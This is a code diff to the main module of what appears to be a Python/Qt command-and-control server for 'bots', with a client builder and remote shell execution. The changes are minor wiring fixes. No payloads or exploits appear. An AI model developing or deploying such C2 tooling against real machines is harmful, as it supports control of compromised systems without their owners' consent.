@@ -10,6 +10,7 @@ from qtpy.QtCore import Qt, QObject, qInstallMessageHandler, Slot
 import qrainbowstyle
 from qrainbowstyle.extras import qt_message_handler
 
+from models.Bot import Bot
 from __init__ import __version__, __app_name__
 from core.Network import GUIServer, C2Server
 from core.build import ClientBuilder
@@ -74,7 +75,7 @@ class Main(QObject):
     def on_config_read(self, config: dict):
         """Start GUI and C2 server."""
         self.logger.info("Configuration files found")
-        gui_ip, gui_port, gui_key = config.get("gui_ip"), config.get("gui_port"), config.get("gui_key")
+        gui_ip, gui_port, gui_key = config.get("gui_ip"), config.get("gui_port"), config.get("gui_key").encode()
 
         self.config_manager.config_get.connect(self.gui_server.on_config_get)
         self.config_manager.available_tasks.connect(self.gui_server.on_get_tasks)
@@ -102,10 +103,8 @@ class Main(QObject):
 
         self.logger.info("Starting GUI server")
         self.gui_server.start(gui_ip, gui_port, gui_key)
-        self.gui_server.setJSONDecoder(MessageDecoder)
-        self.gui_server.setJSONEncoder(MessageEncoder)
 
-        self.c2server.assigned.connect(self.on_bot_connected)
+        self.c2server.connected.connect(self.on_bot_connected)
         self.c2server.disconnected.connect(self.gui_server.on_bot_disconnected)
         self.c2server.task.connect(self.gui_server.on_bot_task)
         self.c2server.info.connect(self.gui_server.on_bot_info)
@@ -115,9 +114,7 @@ class Main(QObject):
         self.gui_server.run_shell.connect(self.c2server.run_shell)
 
         self.logger.info("Starting C2 server")
-        self.c2server.start(config.get("c2_ip"), config.get("c2_port"), config.get("c2_key"))
-        self.c2server.setJSONDecoder(MessageDecoder)
-        self.c2server.setJSONEncoder(MessageEncoder)
+        self.c2server.start(config.get("c2_ip"), config.get("c2_port"), config.get("c2_key").encode())
 
         if self.start_gui:
             self.gui = MainWindow(local=True)
@@ -128,8 +125,8 @@ class Main(QObject):
     def on_bot_connected(self, bot, ip, port):
         """Get basic informations from client."""
         infos = self.config_manager.value("after_connection_infos")
-        self.c2server.send_info(bot_id, infos)
-        self.gui_server.on_bot_connected(bot_id, ip, port)
+        self.c2server.send_info(bot, infos)
+        self.gui_server.on_bot_connected(bot, ip, port)
 
     @Slot()
     def close(self):
